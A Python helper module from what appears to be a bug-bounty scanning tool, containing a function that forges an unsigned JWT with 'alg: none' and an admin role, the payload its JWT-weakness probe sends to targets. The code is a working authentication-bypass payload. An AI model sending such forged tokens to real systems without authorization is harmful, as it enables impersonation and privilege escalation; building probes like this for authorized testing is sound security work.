"""Token helpers for the web engine.

Kept separate from :mod:`bountymode.engine.web` so the JWT probe can forge a
token without importing the whole engine, and so the forging logic is testable
on its own.
"""

from __future__ import annotations

import base64
import json
import time
from typing import Any, Dict


def _b64e(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def forge_none_token(sub: int = 1, role: str = "admin") -> str:
    """Build an unsigned JWT with ``alg: none``.

    A target that accepts this has not verified the signature: the token is
    trivially forgeable and any identity can be assumed.  This is the payload
    the ``jwt_weakness`` probe sends.
    """
    header: Dict[str, Any] = {"alg": "none", "typ": "JWT"}
    payload: Dict[str, Any] = {"sub": sub, "role": role, "iat": int(time.time())}
    h = _b64e(json.dumps(header, separators=(",", ":")).encode())
    p = _b64e(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."
